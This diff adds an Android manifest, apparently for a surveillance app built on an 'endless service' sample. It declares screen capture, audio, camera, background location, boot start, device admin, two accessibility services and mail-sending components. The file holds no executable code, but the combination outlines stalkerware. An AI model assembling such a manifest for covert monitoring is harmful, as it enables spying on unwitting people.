@@ -1,0 +1,126 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+        package="com.robertohuertas.endless">
+
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.GET_TASKS" />
+    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.BROADCAST_PACKAGE_REMOVED" />
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+    <uses-permission android:name="android.permission.VIBRATE" />
+    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
+
+    <application
+            android:allowBackup="true"
+            android:icon="@mipmap/ic_launcher"
+            android:label="@string/app_name"
+            android:requestLegacyExternalStorage="true"
+            android:roundIcon="@mipmap/ic_launcher_round"
+            android:supportsRtl="true"
+            android:theme="@style/AppTheme">
+
+        <activity android:name=".EnterPasswordActivity" />
+        <activity android:name=".CreatePasswordActivity" />
+        <activity android:name=".forgotpass" />
+        <activity android:name=".SendMailActivity" />
+        <activity android:name=".SplashActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <service
+                android:name=".EndlessService"
+                android:enabled="true"
+                android:exported="false"
+                android:foregroundServiceType="mediaProjection|location|camera|microphone">
+
+        </service>
+        <service
+                android:name=".SendMailActivity2"
+                android:enabled="true"
+                android:exported="false"
+                android:foregroundServiceType="mediaProjection">
+
+        </service>
+        <service
+                android:name=".ScreenCaptureService"
+                android:foregroundServiceType="mediaProjection|location|camera|microphone"
+                android:permission="android.permission.BIND_JOB_SERVICE">
+
+        </service>
+
+        <activity android:name=".MainActivity">
+
+        </activity>
+        <activity android:name=".MainActivity2">
+        </activity>
+        <receiver
+                android:name=".StartReceiver"
+                android:description="@string/app_name"
+                android:enabled="true"
+                android:label="@string/app_name"
+                android:permission="android.permission.BIND_DEVICE_ADMIN">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+            </intent-filter>
+
+            <meta-data
+                    android:name="android.app.device_admin"
+                    android:resource="@xml/policies" />
+        </receiver>
+        <receiver
+                android:name=".DeviceAdmin"
+                android:description="@string/app_name"
+                android:label="@string/app_name"
+                android:permission="android.permission.BIND_DEVICE_ADMIN">
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+            </intent-filter>
+
+            <meta-data
+                    android:name="android.app.device_admin"
+                    android:resource="@xml/policies" />
+        </receiver>
+
+        <service
+                android:name=".TestAccessibleService"
+                android:enabled="true"
+                android:exported="true"
+                android:label="NGĂN2"
+                android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+
+            <meta-data
+                    android:name="android.accessibilityservice"
+                    android:resource="@xml/accessible_service_config" />
+        </service>
+        <service
+                android:name=".TestAccessibleService2"
+                android:enabled="true"
+                android:exported="true"
+                android:label="NGĂN1"
+                android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+
+            <meta-data
+                    android:name="android.accessibilityservice"
+                    android:resource="@xml/accessible_service_config" />
+        </service>
+    </application>
+
+</manifest>
